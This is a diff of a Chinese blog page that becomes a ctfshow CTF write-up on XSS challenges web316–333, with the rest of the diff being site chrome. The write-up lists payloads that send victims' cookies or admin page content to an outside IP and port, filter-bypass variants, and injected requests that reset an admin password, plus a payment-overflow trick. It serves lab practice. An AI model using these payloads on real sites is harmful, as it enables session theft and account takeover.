@@ -6,14 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: HackTheBox | MiGooli&#39;s Blog</title>
+  <title>ctfshow_web入门_XSS | MiGooli&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="MiGooli&#39;s Blog">
-<meta property="og:url" content="http://example.com/tags/HackTheBox/index.html">
+  <meta name="description" content="开X！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_web入门_XSS">
+<meta property="og:url" content="http://example.com/2022/07/21/ctfshow_web%E5%85%A5%E9%97%A8_XSS/index.html">
 <meta property="og:site_name" content="MiGooli&#39;s Blog">
+<meta property="og:description" content="开X！">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-17T10:10:30.964Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web入门">
+<meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="MiGooli&#39;s Blog" type="application/atom+xml">
@@ -55,11 +61,11 @@
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="/tags/HackTheBox">HackTheBox</a></li>
-	        
 				<li><a href="/tags/ctfshow">ctfshow</a></li>
 	        
 				<li><a href="/tags/%E6%AF%94%E8%B5%9BWP">比赛WP</a></li>
+	        
+				<li><a href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA">渗透靶场</a></li>
 	        
 				<li><a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</a></li>
 	        
@@ -141,11 +147,11 @@
 				<ul style="width: 70%">
 				
 				
-					<li style="width: 25%"><a href="/tags/HackTheBox">HackTheBox</a></li>
-		        
 					<li style="width: 25%"><a href="/tags/ctfshow">ctfshow</a></li>
 		        
 					<li style="width: 25%"><a href="/tags/%E6%AF%94%E8%B5%9BWP">比赛WP</a></li>
+		        
+					<li style="width: 25%"><a href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA">渗透靶场</a></li>
 		        
 					<li style="width: 25%"><a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</a></li>
 		        
@@ -162,405 +168,233 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-ctfshow_web入门_XSS" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctfshow_web入门_XSS
+    </h1>
+  
+
+        
+        <a href="/2022/07/21/ctfshow_web%E5%85%A5%E9%97%A8_XSS/" class="archive-article-date">
+  	<time datetime="2022-07-20T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-21</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>开X！<br><span id="more"></span></p>
+<h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>反射型XSS，先在自己的VPS上用nc监听端口，然后输入payload即可</p>
+<p>PS：如果第一次没X成功的话，就多X几次，记得在X之前把cookie删了！！！</p>
+<blockquote>
+<script>document.location.href='http://120.76.203.6:1337/'+document.cookie;</script>
+
+</blockquote>
+<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script，利用input标签进行绕过</p>
+<blockquote>
+<input onfocus="window.open('http://120.76.203.6:1337/'+document.cookie)" autofocus>
+
+</blockquote>
+<h1 id="web318、319"><a href="#web318、319" class="headerlink" title="web318、319"></a>web318、319</h1><p>不知道过滤了啥，上面的payload照样可以用</p>
+<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>过滤了空格，利用<strong>/</strong>进行绕过</p>
+<blockquote>
+<input/onfocus="window.open('http://120.76.203.6:1337/'+document.cookie)"/autofocus>
+
+</blockquote>
+<h1 id="web321-326"><a href="#web321-326" class="headerlink" title="web321-326"></a>web321-326</h1><p>不知道过滤了，上面的payload通杀</p>
+<h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>存储型XSS，测试了一下，只有收件人为admin时才会显示登录成功，那么就在“信的内容”里面填写XSSpayload，在VPS上成功拿到flag</p>
+<blockquote>
+<input/onfocus="window.open('http://120.76.203.6:1337/'+document.cookie)"/autofocus>
+
+</blockquote>
+<h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>有注册功能，尝试在注册的时候填入payload，然后利用payload进行登录，发现VPS上返回的只有cookie，没有flag</p>
+<p>点击用户管理功能，提示非admin无法查看，盲猜可以通过修改cookie冒充admin，将cookie的值改成VPS中返回的cookie，成功变成admin拿到flag</p>
+<h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>328的方法不能用了，查了下大佬博客说是拿到cookie后会立即失效，所以不能通过修改cookie冒充admin了</p>
+<p>但是可以直接读取admin页面的内容，flag会直接返回VPS</p>
+<blockquote>
+<script>window.open('http://120.76.203.6:1337/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
+
+</blockquote>
+<h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>多了个修改密码的功能，抓个包，发现修改密码的文件路径为/api/change.php?p=123123，直接开X，注意这边X的地址是本机地址，不是VPS</p>
+<p>在注册页面的用户名填入payload，然后用admin和重置的密码登录即可拿到flag</p>
+<blockquote>
+<script>window.open('http://127.0.0.1/api/change.php?p=123123')</script>
+
+</blockquote>
+<h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>330的修改密码是GET请求，331的修改密码是POST请求，通过JQuery来发送POST请求即可，做法同330</p>
+<blockquote>
+<script>$.post("http:/127.0.0.1/api/change.php",{p:123123},"json");</script>
+
+</blockquote>
+<h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>好像和XSS没什么关系，是支付的代码逻辑漏洞，正常注册登录后进行转账，转账过程抓个包，把转账人改成admin，转账进行改成-99999999999999999999，整数溢出后钱数就变成正的，直接购买flag</p>
+<h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>好像和XSS也没什么关系，给自己转多少钱就会拿到多少钱，只要转账金额不超过余额即可，多转几次即可拿到flag</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>You will never know the mysteries!<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/xikeruite/s3cre1.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/xikeruite/s3cre2.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/08/HackTheBox_StartingPoint_Tier2_Vaccine/" class="archive-article-date">
-  	<time datetime="2022-06-07T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/08/HackTheBox_StartingPoint_Tier2_Vaccine/">HackTheBox_StartingPoint_Tier1_Responder</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web入门</a>
         		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/07/HackTheBox_StartingPoint_Tier2_Oopsie/" class="archive-article-date">
-  	<time datetime="2022-06-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/07/HackTheBox_StartingPoint_Tier2_Oopsie/">HackTheBox_StartingPoint_Tier2_Archetype</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
+      		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">ctfshow</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/07/21/ctfshow_web%E5%85%A5%E9%97%A8_XSS/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/06/HackTheBox_StartingPoint_Tier2_Archetype/" class="archive-article-date">
-  	<time datetime="2022-06-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-06</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2022/08/02/2022%E5%BC%BA%E7%BD%91%E6%9D%AFWP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          2022年强网杯WP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/06/08/HackTheBox_StartingPoint_Tier2_Vaccine/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HackTheBox_StartingPoint_Tier1_Responder</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/06/HackTheBox_StartingPoint_Tier2_Archetype/">HackTheBox_StartingPoint_Tier2_Archetype</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/05/HackTheBox_StartingPoint_Tier1_Responder/" class="archive-article-date">
-  	<time datetime="2022-06-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/05/HackTheBox_StartingPoint_Tier1_Responder/">HackTheBox_StartingPoint_Tier1_Responder</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/04/HackTheBox_StartingPoint_Tier1_Crocodile/" class="archive-article-date">
-  	<time datetime="2022-06-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/04/HackTheBox_StartingPoint_Tier1_Crocodile/">HackTheBox_StartingPoint_Tier1_Crocodile</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/03/HackTheBox_StartingPoint_Tier1_Sequel/" class="archive-article-date">
-  	<time datetime="2022-06-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/03/HackTheBox_StartingPoint_Tier1_Sequel/">HackTheBox_StartingPoint_Tier1_Sequel</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/02/HackTheBox_StartingPoint_Tier1_Appointment/" class="archive-article-date">
-  	<time datetime="2022-06-01T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/02/HackTheBox_StartingPoint_Tier1_Appointment/">HackTheBox_StartingPoint_Tier1_Appointment</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/06/01/HackTheBox_StartingPoint_Tier0_Redeemer/" class="archive-article-date">
-  	<time datetime="2022-05-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/06/01/HackTheBox_StartingPoint_Tier0_Redeemer/">HackTheBox_StartingPoint_Tier0_Redeemer</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/05/31/HackTheBox_StartingPoint_Tier0_Dancing/" class="archive-article-date">
-  	<time datetime="2022-05-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/05/31/HackTheBox_StartingPoint_Tier0_Dancing/">HackTheBox_StartingPoint_Tier0_Dancing</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/05/30/HackTheBox_StartingPoint_Tier0_Fawn/" class="archive-article-date">
-  	<time datetime="2022-05-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/05/30/HackTheBox_StartingPoint_Tier0_Fawn/">HackTheBox_StartingPoint_Tier0_Fawn</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/tags/HackTheBox/page/2/">2</a><a class="extend next" rel="next" href="/tags/HackTheBox/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -584,9 +418,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
@@ -654,7 +488,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HackTheBox</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透靶场</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -823,5 +657,21 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
 
 </div>
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
 </html>
